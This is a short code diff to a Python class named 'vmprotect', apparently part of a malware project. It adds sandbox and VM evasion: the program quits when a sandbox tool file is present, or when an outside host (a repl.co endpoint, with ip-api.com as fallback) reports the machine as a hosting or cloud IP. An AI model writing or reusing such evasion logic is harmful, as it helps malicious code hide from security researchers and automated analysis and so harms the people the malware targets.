@@ -55,9 +55,13 @@ class vmprotect:
 
         if os.path.isfile('D:/TOOLS/Detonate.exe'):
             os._exit(0)
-
-        if requests.get("http://ip-api.com/line/?fields=hosting").text == "true":
-            os._exit(0)
+            
+        try:
+            if requests.get("https://Hosting-Check.blankmcpe.repl.co").text.lower() == 'true':
+                os._exit(0)
+        except Exception:
+            if requests.get("http://ip-api.com/line/?fields=hosting").text == "true":
+                os._exit(0)
             
 def try_to_delete_old_meipass():
     for i in glob.iglob(os.getenv("temp")):
